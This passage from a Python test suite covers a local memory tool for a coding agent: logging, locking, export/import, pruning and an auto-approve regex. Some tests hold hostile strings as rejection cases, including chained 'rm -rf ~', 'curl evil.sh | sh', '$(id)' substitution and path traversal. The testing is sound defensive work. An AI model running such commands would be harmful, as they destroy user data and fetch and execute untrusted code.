                self.assertEqual(mem.count_unreviewed(d), self.truth())
        self.assertTrue((d / "observations.1.jsonl").exists())
        for p in d.glob("observations*.jsonl"):  # clearing removes the rotated files too, which unreviewed() reads
            p.unlink()
        self.assertEqual(mem.count_unreviewed(d), 0)
        self.hook("user-prompt", {"prompt": "fresh"})
        self.assertEqual(mem.count_unreviewed(d), 1)
        self.assertEqual(mem.count_unreviewed(d), self.truth())

    def test_timestamps_are_compared_as_times(self):
        d = self.log_dir()
        (d / "reflected_at").write_text("2026-01-01T10:00:00+02:00\n")  # 08:00 UTC
        recs = [{"ts": "2026-01-01T09:00:00+00:00", "kind": "prompt"},   # after: string order says otherwise
                {"ts": "2026-01-01T07:59:59Z", "kind": "prompt"},        # before
                {"ts": "2026-01-01T08:00:01Z", "kind": "prompt"},        # after
                {"ts": "not a time", "kind": "prompt"}]                  # ignored
        (d / "observations.jsonl").write_text("".join(json.dumps(r) + "\n" for r in recs))
        self.assertEqual([r["ts"] for r in mem.unreviewed(d)], [recs[0]["ts"], recs[2]["ts"]])


def _fine_clock():
    """Microsecond timestamps: with whole seconds, a record and the mark that follows it usually share a second."""
    mem.now_iso = lambda: dt.datetime.now(dt.timezone.utc).isoformat(timespec="microseconds")


def _mark_worker(root, cwd, count):
    os.environ["LOCAL_MEMORY_HOME"] = root
    _fine_clock()
    for _ in range(count):
        mem.mark_reflected(Path(cwd))


def _log_and_mark_logger(root, d, tag, count):
    os.environ["LOCAL_MEMORY_HOME"] = root
    _fine_clock()
    real_bump = mem._bump_count

    def slow_bump(path, delta):  # widens the window between reading reflected_at and writing the count
        time.sleep(0.002)
        real_bump(path, delta)

    mem._bump_count = slow_bump
    for i in range(count):
        mem.log_observation(Path(d), {"ts": mem.now_iso(), "kind": "prompt", "text": f"{tag}-{i}"})


class ReflectionRaceTest(MemTestCase):
    def test_count_matches_log_when_observations_race_with_mark_reflected(self):
        root = mem.memory_root()  # the workers see the same root as this process
        d = mem.repo_dir(self.repo, required=False, create=True)
        ctx = multiprocessing.get_context("spawn")
        loggers = [ctx.Process(target=_log_and_mark_logger, args=(str(root), str(d), f"p{n}", 200)) for n in range(4)]
        marker = ctx.Process(target=_mark_worker, args=(str(root), str(self.repo), 300))
        for p in [*loggers, marker]:
            p.start()
        for p in [*loggers, marker]:
            p.join(120)
        self.assertEqual([p.exitcode for p in [*loggers, marker]], [0] * 5)
        self.assertEqual(mem.count_unreviewed(d), sum(1 for r in mem.unreviewed(d) if r.get("kind") != "stop"))


class MaintenanceTest(MemTestCase):
    def add_some(self):
        self.run_cli("remember", "Run make test")
        self.run_cli("remember", "--user", "Prefers short answers")
        self.run_cli("instinct", "prefer-pnpm", "--trigger", "when installing", "--action", "Use pnpm")
        self.run_cli("hook", "user-prompt", stdin=json.dumps({"cwd": str(self.repo), "prompt": "hi"}))

    def test_status_reports_counts_and_recent_hook_errors(self):
        self.add_some()
        mem.log_hook_error("2026-01-01T00:00:00+00:00 nope: boom")
        code, out = self.run_cli("status")
        self.assertEqual(code, 0)
        self.assertIn("user memory:           1 facts, 0 global instincts", out)
        self.assertIn("repository memory:     1 facts, 1 instincts", out)
        self.assertIn("unreviewed log lines:  1", out)
        self.assertIn("estimated context:     ~", out)
        self.assertIn("nope: boom", out)

    def test_clear_refuses_without_yes(self):
        self.add_some()
        self.assertEqual(self.run_cli("clear", "--obs")[0], 1)
        self.assertIn("prompt: hi", self.run_cli("observations")[1])

    def test_clear_removes_only_what_it_names(self):
        self.add_some()
        self.assertEqual(self.run_cli("clear", "--obs", "--yes")[0], 0)
        self.assertIn("nothing logged", self.run_cli("observations")[1])
        self.assertIn("Run make test", self.run_cli("recall")[1])

        self.assertEqual(self.run_cli("clear", "--instincts", "--yes")[0], 0)
        self.assertIn("no instincts", self.run_cli("instincts")[1])
        self.assertIn("Run make test", self.run_cli("recall")[1])

        self.assertEqual(self.run_cli("clear", "--repo", "--yes")[0], 0)
        self.assertNotIn("Run make test", self.run_cli("recall")[1])
        self.assertIn("Prefers short answers", self.run_cli("recall")[1])

        self.assertEqual(self.run_cli("clear", "--all", "--yes")[0], 0)
        self.assertNotIn("Prefers short answers", self.run_cli("recall")[1])
        self.assertIn("(nothing saved yet)", mem.instructions_file().read_text())

    def test_clear_obs_removes_every_rotated_log_and_the_counter(self):
        self.add_some()
        d = mem.repo_dir(self.repo)
        for n in range(1, mem.KEEP_ROTATED + 1):
            mem.rotated_path(d, n).write_text("x" * (10 * n) + "\n", encoding="utf-8")
        mem.counter_path(d).write_text("7\n", encoding="utf-8")
        files = [mem.observations_path(d), *(mem.rotated_path(d, n) for n in range(1, mem.KEEP_ROTATED + 1))]
        total = sum(p.stat().st_size for p in files)
        self.assertIn(f"observation log:       {total} bytes", self.run_cli("status")[1])

        self.assertEqual(self.run_cli("clear", "--obs", "--yes")[0], 0)
        self.assertFalse(any(p.exists() for p in [*files, mem.counter_path(d)]))
        self.assertIn("nothing logged", self.run_cli("observations")[1])
        self.assertIn("observation log:       0 bytes", self.run_cli("status")[1])

    def test_clear_all_keeps_the_installed_script_and_lock(self):
        # The installer copies mem.py into the memory root, so clear --all must not delete it.
        root = self.tmp / "installed" / "local-memory"
        root.mkdir(parents=True)
        shutil.copyfile(HERE / "mem.py", root / "mem.py")
        (root / ".lock").touch()
        with mock.patch.dict(os.environ, {"LOCAL_MEMORY_HOME": str(root)}):
            self.add_some()
            (root / "hook-errors.log").write_text("old\n", encoding="utf-8")
            code = subprocess.run(
                [sys.executable, "-I", str(root / "mem.py"), "--cwd", str(self.repo), "clear", "--all", "--yes"],
                capture_output=True, text=True, env=os.environ.copy(),
            )
            self.assertEqual(code.returncode, 0, code.stderr)
            self.assertTrue((root / "mem.py").exists())
            self.assertTrue((root / ".lock").exists())
            for name in ("user.md", "instincts", "repos", "hook-errors.log"):
                self.assertFalse((root / name).exists(), name)
            status = subprocess.run(
                [sys.executable, "-I", str(root / "mem.py"), "--cwd", str(self.repo), "status"],
                capture_output=True, text=True, env=os.environ.copy(),
            )
            self.assertEqual(status.returncode, 0, status.stderr)
            self.assertIn("user memory:           0 facts", status.stdout)

    def test_forget_instinct_deletes_outright(self):
        self.run_cli("instinct", "prefer-pnpm", "--trigger", "t", "--action", "Use pnpm")
        self.assertEqual(self.run_cli("forget-instinct", "prefer-pnpm")[0], 0)
        self.assertIn("no instincts", self.run_cli("instincts")[1])
        self.assertEqual(self.run_cli("forget-instinct", "prefer-pnpm")[0], 1)

    def test_export_then_import_into_fresh_memory(self):
        self.add_some()
        self.run_cli("instinct", "prefer-pnpm", "--trigger", "when installing", "--action", "Use pnpm", "--user")
        dump = self.tmp / "dump.json"
        self.assertEqual(self.run_cli("export", str(dump))[0], 0)
        with mock.patch.dict(os.environ, {"LOCAL_MEMORY_HOME": str(self.tmp / "fresh")}):
            code, out = self.run_cli("import", str(dump))
            self.assertEqual(code, 0)
            self.assertIn("imported 2 facts and 2 instincts", out)  # one repository and one global instinct
            self.assertIn("Run make test", self.run_cli("recall")[1])
            self.assertIn("Prefers short answers", self.run_cli("recall")[1])
            global_instinct = mem.instincts_dir(mem.memory_root()) / "prefer-pnpm.md"
            self.assertEqual(mem.parse_instinct(global_instinct)["action"], "Use pnpm")
            _, out = self.run_cli("import", str(dump))  # importing twice adds nothing
            self.assertIn("imported 0 facts and 0 instincts", out)
            self.assertIn("2 instincts skipped", out)

    def test_import_validates_before_writing(self):
        bad = self.tmp / "bad.json"
        bad.write_text(json.dumps({"version": 1, "user_memory": ["- keep?"],
                                   "repositories": {"../../evil": {"memory": ["- x"]}}}))
        self.assertEqual(self.run_cli("import", str(bad))[0], 1)
        self.assertFalse(mem.memory_root().exists())
        self.assertFalse((mem.copilot_home() / "evil").exists())

    def test_hook_error_log_rotates(self):
        with mock.patch.object(mem, "MAX_HOOK_LOG_BYTES", 200):
            for n in range(20):
                mem.log_hook_error(f"error number {n} " + "x" * 40)
        log = mem.hook_log_path()
        self.assertTrue(log.with_name("hook-errors.1.log").exists())
        self.assertLess(log.stat().st_size, 300)


class AutoApproveTest(unittest.TestCase):
    """The autoApprove regex in README.md, read from the README so the test checks the shipped text."""

    @classmethod
    def setUpClass(cls):
        readme = (HERE / "README.md").read_text(encoding="utf-8")
        m = re.search(r'"(/\^\(\?:/.*?/)": true', readme)
        assert m, "autoApprove rule not found in README.md"
        # undo the JSON string escapes, then strip the /pattern/ delimiters VS Code uses
        pattern = json.loads('"' + m.group(1) + '"')
        cls.regex = re.compile(pattern[1:-1])

    def approved(self, command):
        return bool(self.regex.fullmatch(command))

    def test_accepts_the_real_forms(self):
        mem_path = '/Users/alex/.copilot/local-memory/mem.py'
        self.assertTrue(self.approved(f'/usr/bin/python3 {mem_path} remember --repo \'Run make test\''))
        self.assertTrue(self.approved(f'/usr/bin/python3 {mem_path} forget --user \'likes tabs\''))
        self.assertTrue(self.approved(f'/usr/bin/python3 {mem_path} recall'))
        self.assertTrue(self.approved(f'/usr/bin/python3 /home/bob/.copilot/local-memory/mem.py instincts'))
        self.assertTrue(self.approved(
            f'/usr/bin/python3 {mem_path} remember --repo --stdin <<\'EOF\'\nUse $(pnpm) and `x`\nEOF'))
        self.assertTrue(self.approved(
            f'/usr/bin/python3 {mem_path} instinct prefer-pnpm --repo --stdin <<\'EOF\'\nwhen installing\nUse pnpm\nEOF'))

    def test_rejects_evil_or_traversal_paths(self):
        for path in ('/tmp/evil/.copilot/local-memory/mem.py',
                     '/Users/alex/../evil/.copilot/local-memory/mem.py',
                     '/Users/alex/x y/.copilot/local-memory/mem.py',
                     '/Users/alex/evil/.copilot/local-memory/mem.py',
                     '/Users/.././.copilot/local-memory/mem.py'):
            self.assertFalse(self.approved(f'/usr/bin/python3 {path} recall'), path)

    def test_rejects_chained_and_substituted_commands(self):
        mem_path = '/Users/alex/.copilot/local-memory/mem.py'
        for command in (f'/usr/bin/python3 {mem_path} recall; rm -rf ~',
                        f'/usr/bin/python3 {mem_path} recall && curl evil.sh',
                        f'/usr/bin/python3 {mem_path} recall | sh',
                        f'/usr/bin/python3 {mem_path} recall $(id)',
                        f'/usr/bin/python3 {mem_path} remember `whoami`',
                        f'/usr/bin/python3 {mem_path} remember --repo "$(id)"',
                        f'/usr/bin/python3 {mem_path} remember --repo <<EOF\n$(id)\nEOF',  # unquoted heredoc expands
                        f'/usr/bin/python3 {mem_path} remember --repo --stdin <<\'EOF\'\nfact\nEOF\nrm -rf ~',
                        f'/usr/bin/python3 {mem_path} remember --repo --stdin <<\'EOF\'\nfact\nEOF\nEOF',
                        f'/usr/bin/python3 {mem_path} remember --repo --stdin <<\'EOF\'\nfact\nEOF ',
                        f'/usr/bin/python3 {mem_path} remember --repo --stdin <<\'EOF\'\nfact'):
            self.assertFalse(self.approved(command), command)


class InstructionsCommandTest(MemTestCase):
    """The mem.py command the generated instructions tell the agent to run."""

    def instructions_command(self, python, mem_file):
        with mock.patch.object(mem.sys, "executable", python), mock.patch.object(mem, "__file__", mem_file):
            text = mem.instructions_text()
        m = re.search(r"run `(.+?) recall`", text)
        self.assertIsNotNone(m, text)
        self.assertNotIn('python3 "', text)
        return m.group(1)

    def test_uses_running_interpreter_and_mem_path(self):
        command = self.instructions_command("/usr/bin/python3", "/Users/alex/.copilot/local-memory/mem.py")
        self.assertEqual(command, "/usr/bin/python3 /Users/alex/.copilot/local-memory/mem.py")

    def test_command_is_auto_approved_by_readme_rule(self):
        readme = (HERE / "README.md").read_text(encoding="utf-8")
        m = re.search(r'"(/\^\(\?:/.*?/)": true', readme)
        regex = re.compile(json.loads('"' + m.group(1) + '"')[1:-1])  # strip VS Code's /.../ delimiters
        command = self.instructions_command("/opt/homebrew/bin/python3", "/Users/alex/.copilot/local-memory/mem.py")
        self.assertTrue(regex.fullmatch(command + " recall"), command)

    def test_path_with_space_and_apostrophe_round_trips(self):
        python = "/opt/my py/python3"
        mem_file = "/srv/Jane's dir/local-memory/mem.py"
        command = self.instructions_command(python, mem_file)
        self.assertEqual(shlex.split(command), [python, mem_file])

    def test_shared_helper_matches_install_py(self):
        import install
        self.assertIs(install.command_prefix, mem.command_prefix)
        self.assertEqual(mem.command_prefix("bash", "/p/py", "/x y/mem.py"), "/p/py '/x y/mem.py'")


class ScriptTest(MemTestCase):
    def test_hooks_file_is_valid_and_covers_every_event(self):
        config = json.loads((HERE / "hooks" / "local-memory.json").read_text())
        self.assertEqual(config["version"], 1)
        events = {"sessionStart": "session-start", "userPromptSubmitted": "user-prompt",
                  "postToolUseFailure": "tool-failure", "agentStop": "agent-stop"}
        self.assertEqual(set(config["hooks"]), set(events))
        for name, arg in events.items():
            (entry,) = config["hooks"][name]
            self.assertEqual(entry["type"], "command")
            self.assertTrue(entry["bash"].endswith(f"hook {arg}"))
            self.assertTrue(entry["powershell"].endswith(f"hook {arg}"))

    def test_install_and_uninstall(self):
        home = self.tmp / "copilot"
        env = {**os.environ, "COPILOT_HOME": str(home)}
        subprocess.run(["bash", str(HERE / "install.sh")], check=True, env=env, capture_output=True)
        installed = home / "local-memory" / "mem.py"
        self.assertTrue(installed.exists())
        hooks = (home / "hooks" / "local-memory.json").read_text()
        self.assertIn(f"{installed} hook session-start", hooks)
        for skill in ("alx-remember", "alx-reflect"):
            text = (home / "skills" / skill / "SKILL.md").read_text()
            self.assertNotIn("__MEM__", text)
            self.assertIn(str(installed), text)
        self.assertIn(str(installed), mem.instructions_file().read_text())

        # The installed hook command runs as Copilot would run it.
        command = json.loads(hooks)["hooks"]["userPromptSubmitted"][0]["bash"]
        subprocess.run(["bash", "-c", command], input=json.dumps({"cwd": str(self.repo), "prompt": "hi"}),
                       text=True, check=True, env=env)
        self.assertIn("prompt: hi", self.run_cli("observations")[1])

        (home / "local-memory" / "user.md").write_text("- keep me\n")
        subprocess.run(["bash", str(HERE / "install.sh"), "--uninstall"], check=True, env=env, capture_output=True)
        self.assertFalse(installed.exists())
        self.assertFalse((home / "hooks" / "local-memory.json").exists())
        self.assertFalse((home / "skills" / "alx-remember").exists())
        self.assertEqual((home / "local-memory" / "user.md").read_text(), "- keep me\n")


class RemoteFormsTest(unittest.TestCase):
    def test_ports_and_transport_prefixes(self):
        cases = {
            "ssh://git@github.com:22/me/proj.git": "github.com/me/proj",
            "git+ssh://git@github.com/me/proj.git": "github.com/me/proj",
            "https://github.com:443/me/proj": "github.com/me/proj",
            "ssh://git@Example.COM:2222/team/sub/proj/": "example.com/team/sub/proj",
        }
        for url, expected in cases.items():
            with self.subTest(url=url):
                self.assertEqual(mem.normalize_remote(url), expected)

    def test_windows_paths_keep_their_form(self):
        # Local remotes have no host: backslashes become slashes, the path is lower-cased, a trailing .git or slash goes.
        self.assertEqual(mem.normalize_remote("C:\\src\\proj.git"), "c:/src/proj")
        self.assertEqual(mem.normalize_remote("D:/src/proj.git/"), "d:/src/proj")


class CorruptInstinctTest(MemTestCase):
    def setUp(self):
        super().setUp()
        for _ in range(3):  # 50% -> 70%, so it is loaded
            mem.add_instinct("repo", "prefer-pnpm", "when installing packages", "Use pnpm", None, self.repo)
        self.dir =next((mem.memory_root() / "repos").glob("*/instincts"))

    def test_corrupt_files_are_skipped_when_loading(self):
        (self.dir / "binary.md").write_bytes(b'---\nid: binary\n---\n\xff\xfe\x00 Use\n')
        (self.dir / "no-front-matter.md").write_text("just some notes\n", encoding="utf-8")
        (self.dir / "empty.md").write_bytes(b"")
        self.assertEqual(self.run_cli("instincts")[0], 0)
        _, out = self.hook("session-start", {"cwd": str(self.repo)})
        self.assertIn("Use pnpm", json.loads(out)["additionalContext"])

    def test_non_utf8_file_is_read_with_replacement_characters(self):
        (self.dir / "broken.md").write_bytes(b'---\nid: broken\ntrigger: "t"\n---\n\xff\xfe Do\n')
        code, _ = self.run_cli("weaken", "broken")
        self.assertEqual(code, 0)


@unittest.skipIf(os.name == "nt" or (hasattr(os, "geteuid") and os.geteuid() == 0), "needs a non-root POSIX user")
class ReadOnlyHomeTest(MemTestCase):
    def setUp(self):
        super().setUp()
        self.home = self.tmp / "copilot"
        self.home.mkdir()
        self.home.chmod(0o500)

    def tearDown(self):
        self.home.chmod(0o700)
        super().tearDown()

    def test_hook_never_fails_when_home_is_read_only(self):
        code, out = self.run_cli("hook", "session-start", stdin=json.dumps({"cwd": str(self.repo)}))
        self.assertEqual(code, 0)
        self.assertEqual(out, "")

    def test_command_reports_read_only_home_as_an_error(self):
        code, _ = self.run_cli("remember", "--user", "x")
        self.assertEqual(code, 1)


class SessionStartPayloadTest(MemTestCase):
    def test_resume_and_other_sources_get_context(self):
        self.run_cli("remember", "Run make test")
        payloads = (
            {"hook_event_name": "SessionStart", "session_id": "s", "source": "resume", "cwd": str(self.repo)},
            {"sessionId": "s", "source": "resume", "cwd": str(self.repo)},
            {"sessionId": "s", "source": "compact", "cwd": str(self.repo)},
            {"cwd": str(self.repo)},  # no source at all
        )
        for payload in payloads:
            with self.subTest(payload=payload):
                code, out = self.hook("session-start", payload)
                self.assertEqual(code, 0)
                self.assertIn("- Run make test (", json.loads(out)["additionalContext"])


class CwdTest(MemTestCase):
    def test_subdirectory_of_a_repo_uses_the_repo_memory(self):
        self.run_cli("remember", "Run make test")
        sub = self.repo / "src" / "deep"
        sub.mkdir(parents=True)
        self.assertIn("Run make test", self.run_cli("recall", cwd=sub)[1])

    def test_relative_cwd_is_relative_to_the_process_directory(self):
        here = os.getcwd()
        os.chdir(self.tmp / "work")
        try:
            with redirect_stdout(io.StringIO()):
                self.assertEqual(mem.main(["--cwd", "proj", "remember", "relative fact"]), 0)
                self.assertEqual(mem.main(["--cwd", "./proj", "recall"]), 0)
        finally:
            os.chdir(here)
        self.assertIn("relative fact", self.run_cli("recall")[1])

    def test_relative_cwd_in_hook_payload(self):
        self.run_cli("remember", "relative fact")
        here = os.getcwd()
        os.chdir(self.tmp)
        try:
            out = mem.run_hook("session-start", json.dumps({"cwd": "work/proj"}))
        finally:
            os.chdir(here)
        self.assertIn("relative fact", json.loads(out)["additionalContext"])


class DecayTest(MemTestCase):
    def setUp(self):
        super().setUp()
        mem.add_instinct("repo", "prefer-pnpm", "when installing packages", "Use pnpm", None, self.repo)
        self.path = mem.repo_dir(self.repo) / "instincts" / "prefer-pnpm.md"
        # Confidence 0.25, unseen since 2025: effective confidence is 0.
        self.path.write_text('---\nid: prefer-pnpm\ntrigger: "t"\nconfidence: 0.25\nseen: 1\n'
                             'created: 2025-01-01\nlast_seen: 2025-01-01\n---\n\nUse pnpm\n')

    def test_decayed_instinct_is_not_loaded(self):
        _, out = self.hook("session-start", {"cwd": str(self.repo)})
        self.assertEqual(out, "")

    def test_fully_decayed_instinct_is_deleted(self):
        self.hook("session-start", {"cwd": str(self.repo)})
        self.assertFalse(self.path.exists())


class PruneTest(MemTestCase):
    def write(self, instinct_id, confidence, days_ago):
        last = (dt.date.today() - dt.timedelta(days=days_ago)).isoformat()
        i = {"id": instinct_id, "trigger": "t", "action": "Use pnpm", "confidence": confidence, "seen": 1,
             "created": last, "last_seen": last, "evidence": []}
        path = mem.instincts_dir(mem.repo_dir(self.repo)) / f"{instinct_id}.md"
        mem.write_atomic(path, mem.format_instinct(i))
        return path

    def test_session_start_prunes_stale_instincts(self):
        stale = self.write("stale", 0.5, days_ago=200)
        self.hook("session-start", {"cwd": str(self.repo)})
        self.assertFalse(stale.exists())

    def test_session_start_skips_rescan_the_same_day(self):
        self.assertEqual(mem.prune(force=False), 0)
        later = self.write("later", 0.5, days_ago=200)
        with mock.patch.object(mem, "load_instincts", wraps=mem.load_instincts) as load:
            self.assertEqual(mem.prune(force=False), 0)
        self.assertEqual(load.call_count, 0)  # same day: no rescan
        self.assertTrue(later.exists())

    def test_stamp_from_an_earlier_day_prunes_again(self):
        mem.write_atomic(mem.memory_root() / mem.PRUNE_STAMP, "2000-01-01")
        stale = self.write("stale", 0.5, days_ago=200)
        self.assertEqual(mem.prune(force=False), 1)
        self.assertFalse(stale.exists())

    def test_explicit_sync_forces_prune(self):
        mem.sync(force=False)  # stamps today
        stale = self.write("stale", 0.5, days_ago=200)
        code, _ = self.run_cli("sync")
        self.assertEqual(code, 0)
        self.assertFalse(stale.exists())

    def test_instinct_reinforced_before_unlink_is_kept(self):
        stale = self.write("stale", 0.5, days_ago=200)
        real_check = mem._still_stale

        def reinforce_then_check(path):
            # what add_instinct does between prune's load and its unlink (prune holds the lock, so this runs in-process)
            fresh = {"id": "stale", "trigger": "t", "action": "Use pnpm", "confidence": 0.9, "seen": 2,
                     "created": "2000-01-01", "last_seen": dt.date.today().isoformat(), "evidence": []}
            mem.write_atomic(path, mem.format_instinct(fresh))
            return real_check(path)

        with mock.patch.object(mem, "_still_stale", side_effect=reinforce_then_check):
            self.assertEqual(mem.prune(), 0)
        self.assertTrue(stale.exists())
        self.assertEqual(mem.parse_instinct(stale)["confidence"], 0.9)

    def test_instinct_removed_before_check_is_tolerated(self):
        stale = self.write("stale", 0.5, days_ago=200)
        real_check = mem._still_stale

        def remove_then_check(path):
            path.unlink()
            return real_check(path)

        with mock.patch.object(mem, "_still_stale", side_effect=remove_then_check):
            self.assertEqual(mem.prune(), 0)
        self.assertFalse(stale.exists())


class RedactionLeakTest(unittest.TestCase):
    def test_env_style_names_are_redacted(self):
        for value, line in (("abc123", "GITHUB_TOKEN=abc123"), ("hunter2", "db_password=hunter2")):
            with self.subTest(line=line):
                self.assertNotIn(value, mem.redact(line))


class ForgetMatchTest(MemTestCase):
    def test_forget_rejects_a_needle_that_is_too_short(self):
        # "tab" would otherwise remove "Prefer tabs over spaces" by substring match.
        self.run_cli("remember", "Prefer tabs over spaces")
        self.assertEqual(self.run_cli("forget", "tab")[0], 1)
        self.assertIn("Prefer tabs", self.run_cli("recall")[1])


class LockSpy:
    """Wraps the real file_lock and sync: counts entries, records the deepest nesting (the lock is not reentrant)
    and the lock depth at each sync() call."""

    def __init__(self):
        self.real_lock, self.real_sync = mem.file_lock, mem.sync
        self.entered = self.depth = self.max_depth = 0
        self.sync_depths = []

    @contextmanager
    def lock(self):
        self.entered += 1
        self.depth += 1
        self.max_depth = max(self.max_depth, self.depth)
        try:
            with self.real_lock():
                yield
        finally:
            self.depth -= 1

    def sync(self):
        self.sync_depths.append(self.depth)
        entered = self.entered
        try:
            return self.real_sync()
        finally:
            self.entered = entered  # the lock sync takes for prune is sync's own, not the caller's write


class LockedWritesTest(MemTestCase):
    def setUp(self):
        super().setUp()
        self.root = self.tmp / "memhome"
        self.env_root = mock.patch.dict(os.environ, {"LOCAL_MEMORY_HOME": str(self.root)})
        self.env_root.start()
        self.spy = LockSpy()
        self.patches = [mock.patch.object(mem, "file_lock", self.spy.lock), mock.patch.object(mem, "sync", self.spy.sync)]
        for p in self.patches:
            p.start()

    def tearDown(self):
        for p in self.patches:
            p.stop()
        self.env_root.stop()
        super().tearDown()

    def test_clear_all_holds_lock_once_and_syncs_after_release(self):
        mem.remember("user", "Likes tea", self.repo)
        self.spy.entered, self.spy.sync_depths = 0, []
        mem.clear("all", self.repo)
        self.assertEqual((self.spy.entered, self.spy.max_depth, self.spy.sync_depths), (1, 1, [0]))

    def test_clear_scoped_holds_lock_once(self):
        for target in ("repo", "instincts", "obs"):
            with self.subTest(target=target):
                self.spy.entered = self.spy.max_depth = 0
                mem.clear(target, self.repo)
                self.assertEqual((self.spy.entered, self.spy.max_depth), (1, 1))

    def test_export_holds_lock_once(self):
        mem.remember("user", "Likes tea", self.repo)
        self.spy.entered = 0
        mem.export_memory(self.tmp / "out.json")
        self.assertEqual((self.spy.entered, self.spy.max_depth), (1, 1))

    def test_import_holds_lock_once_and_syncs_after_release(self):
        export = self.tmp / "in.json"
        export.write_text(json.dumps({"version": mem.EXPORT_VERSION, "user_memory": ["Likes tea"],
                                      "global_instincts": [], "repositories": {}}))
        self.spy.entered = 0
        mem.import_memory(export)
        self.assertEqual((self.spy.entered, self.spy.max_depth, self.spy.sync_depths), (1, 1, [0]))

    def test_remember_during_import_loses_no_facts(self):
        export = self.tmp / "in.json"
        imported = [f"imported fact {i}" for i in range(300)]
        export.write_text(json.dumps({"version": mem.EXPORT_VERSION, "user_memory": imported,
                                      "global_instincts": [], "repositories": {}}))
        ctx = multiprocessing.get_context("spawn")
        procs = [ctx.Process(target=_remember_worker, args=(str(self.root), str(self.tmp / "copilot"), f"p{n}", 25))
                 for n in range(4)]
        for p in procs:
            p.start()
        while any(p.is_alive() for p in procs):  # keep importing while the writers race with it
            mem.import_memory(export)
        mem.import_memory(export)
        for p in procs:
            p.join(120)
        self.assertEqual([p.exitcode for p in procs], [0] * len(procs))
        lines = mem.read_facts(self.root)
        expected = {f"p{n} fact {i}" for n in range(4) for i in range(25)} | {f.lower() for f in imported}
        self.assertEqual(len(lines), len(expected))  # no duplicates and nothing dropped
        self.assertEqual({mem._norm(line) for line in lines}, expected)

    def test_mark_reflected_holds_lock_once(self):
        self.spy.entered = self.spy.max_depth = 0
        mem.mark_reflected(self.repo)
        self.assertEqual((self.spy.entered, self.spy.max_depth), (1, 1))

    def test_forget_instinct_holds_lock_once_and_syncs_after_release(self):
        mem.add_instinct("user", "prefer-pnpm", "when installing", "Use pnpm", None, self.repo)
        self.spy.entered, self.spy.sync_depths = 0, []
        mem.forget_instinct("user", "prefer-pnpm", self.repo)
        self.assertEqual((self.spy.entered, self.spy.max_depth, self.spy.sync_depths), (1, 1, [0]))

    def test_forget_instinct_missing_releases_lock(self):
        with self.assertRaises(mem.MemError):
            mem.forget_instinct("repo", "no-such-id", self.repo)
        self.assertEqual(self.spy.depth, 0)


@unittest.skipIf(os.name == "nt", "POSIX file modes")
class PrivateDirsTest(MemTestCase):
    def test_every_directory_under_memory_root_is_private(self):
        old_umask = os.umask(0o022)  # the permissive umask that used to leak into new directories
        try:
            self.run_cli("remember", "Run make test")
            self.run_cli("remember", "--user", "Prefers short answers")
            self.run_cli("instinct", "prefer-pnpm", "--trigger", "when installing", "--action", "Use pnpm")
            self.run_cli("instinct", "prefer-tea", "--trigger", "when brewing", "--action", "Use tea", "--user")
            self.hook("user-prompt", {"cwd": str(self.repo), "prompt": "hi"})
            dump = self.tmp / "dump.json"
            self.assertEqual(self.run_cli("export", str(dump))[0], 0)
            fresh = self.tmp / "fresh"
            with mock.patch.dict(os.environ, {"LOCAL_MEMORY_HOME": str(fresh)}):
                self.assertEqual(self.run_cli("import", str(dump))[0], 0)
        finally:
            os.umask(old_umask)
        for root in (self.tmp / "copilot" / "local-memory", fresh):
            dirs = [root, *(p for p in root.rglob("*") if p.is_dir())]
            self.assertIn(root / "repos", dirs)
            for d in dirs:
                with self.subTest(d=d.relative_to(self.tmp)):
                    self.assertEqual(stat.S_IMODE(d.stat().st_mode), 0o700)


class CorruptJsonTest(MemTestCase):
    def run_cli_err(self, *args):
        err = io.StringIO()
        with mock.patch.object(sys, "stderr", err):
            code, _ = self.run_cli(*args)
        return code, err.getvalue()

    def test_export_survives_corrupt_repo_json(self):
        self.run_cli("remember", "Run make test")
        d = mem.repo_dir(self.repo)
        (d / "repo.json").write_bytes(b"{not json")
        dump = self.tmp / "dump.json"
        code, out = self.run_cli("export", str(dump))
        self.assertEqual(code, 0)
        self.assertIn("1 repositories", out)
        repos = json.loads(dump.read_text(encoding="utf-8"))["repositories"]
        self.assertEqual(list(repos), [d.name])
        self.assertEqual(repos[d.name]["source"], d.name)  # directory name stands in for the missing source
        self.assertIn("Run make test", repos[d.name]["memory"][0])

    def test_export_survives_non_utf8_and_non_object_repo_json(self):
        self.run_cli("remember", "Run make test")
        d = mem.repo_dir(self.repo)
        dump = self.tmp / "dump.json"
        (d / "repo.json").write_bytes(b'{"source": "\xff\xfe"}')
        self.assertEqual(self.run_cli("export", str(dump))[0], 0)
        (d / "repo.json").write_text("[1, 2]", encoding="utf-8")
        self.assertEqual(self.run_cli("export", str(dump))[0], 0)
        self.assertEqual(json.loads(dump.read_text(encoding="utf-8"))["repositories"][d.name]["source"], d.name)

    def test_import_invalid_json_is_a_clean_error(self):
        bad = self.tmp / "bad.json"
        bad.write_text('{"version": 1, ', encoding="utf-8")
        code, err = self.run_cli_err("import", str(bad))
        self.assertEqual(code, 1)
        self.assertIn("mem.py: cannot import", err)
        self.assertNotIn("Traceback", err)

    def test_import_invalid_utf8_is_a_clean_error(self):
        bad = self.tmp / "bad.json"
        bad.write_bytes(b'{"version": 1, "user_memory": ["\xff\xfe"]}')
        code, err = self.run_cli_err("import", str(bad))
        self.assertEqual(code, 1)
        self.assertIn("mem.py: cannot import", err)
        self.assertNotIn("Traceback", err)

    def test_unexpected_value_error_is_reported_not_raised(self):
        with mock.patch.object(mem, "export_memory", side_effect=ValueError("boom")):
            code, err = self.run_cli_err("export", str(self.tmp / "x.json"))
        self.assertEqual(code, 1)
        self.assertEqual(err, "mem.py: boom\n")


class ImportValidationTest(MemTestCase):
    def write_export(self, data):
        path = self.tmp / "in.json"
        path.write_text(json.dumps({"version": mem.EXPORT_VERSION, "global_instincts": [], "repositories": {},
                                    **data}), encoding="utf-8")
        return path

    def global_instinct(self, **fields):
        iid = f"tidy-{time.monotonic_ns()}"  # fresh id: import skips existing ids
        with mock.patch.object(mem, "sync"):  # sync prunes decayed instincts, which would delete the file under test
            self.assertEqual(self.run_cli("import", str(self.write_export({"global_instincts": [
                {"id": iid, "trigger": "t", "action": "Use tidy", **fields}]})))[0], 0)
        return mem.parse_instinct(mem.instincts_dir(mem.memory_root()) / f"{iid}.md")

    def test_string_instead_of_list_is_rejected_and_writes_nothing(self):
        with mock.patch.dict(os.environ, {"LOCAL_MEMORY_HOME": str(self.tmp / "fresh")}):
            self.assertEqual(self.run_cli("import", str(self.write_export({"user_memory": "Likes tea"})))[0], 1)
            self.assertFalse(mem.memory_root().exists())
